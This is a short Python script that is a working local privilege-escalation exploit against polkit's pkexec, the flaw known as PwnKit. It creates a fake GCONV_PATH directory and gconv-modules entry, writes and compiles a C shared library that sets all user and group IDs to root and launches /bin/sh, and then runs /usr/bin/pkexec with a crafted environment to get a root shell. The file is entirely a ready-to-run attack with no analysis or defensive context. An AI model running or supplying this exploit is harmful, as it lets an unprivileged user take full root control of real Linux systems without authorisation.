#! /usr/bin/python3

from os import execve, system

def main():

    env = {}

    env["pwnkit"]  = ""
    env["PATH"]    = "GCONV_PATH=."
    env["CHARSET"] = "PWNKIT"
    env["SHELL"]   = "/intentionally/not/a/real/path"

    pwnkit =\
"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");
    exit(0);}
"""

    system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'")
    system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules")

    pwnkitFile = open("pwnkit/pwnkit.c", "w")
    pwnkitFile.write(pwnkit)
    pwnkitFile.close()

    system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC")

    targetBinary = "/usr/bin/pkexec"
    execve(targetBinary, [""], env)

if "__main__" == __name__:
    main()
